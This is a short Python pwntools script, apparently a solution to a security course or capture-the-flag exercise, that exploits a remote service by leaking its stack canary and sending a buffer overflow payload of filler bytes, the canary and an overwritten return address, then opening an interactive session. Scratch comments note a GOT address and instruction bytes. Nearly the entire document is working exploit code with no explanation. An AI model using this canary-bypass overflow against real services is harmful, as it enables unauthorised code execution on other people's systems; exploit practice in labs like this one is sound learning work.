
from pwn import*
import struct

context.log_level = 'debug'
io = remote('inf226.puffling.no',7002)

print(io.recv())
offset = '48'
io.sendline(offset)
number = io.recv()
can = p64(int(number,16))
target = p64(0x401236)
#t = '011111111111111111110111111110111010101111100000'
#print(len(t))
buffoverflow = b'X'*(16)
data = buffoverflow + can + target
io.sendline(data)
print(io.recv())
#io.sendline(data)
#io.recv()
io.interactive()
#0000000000401236

'''
puts 0x404018
404018 -> endbr64
0xfa1e0ff3

706050403020100
'''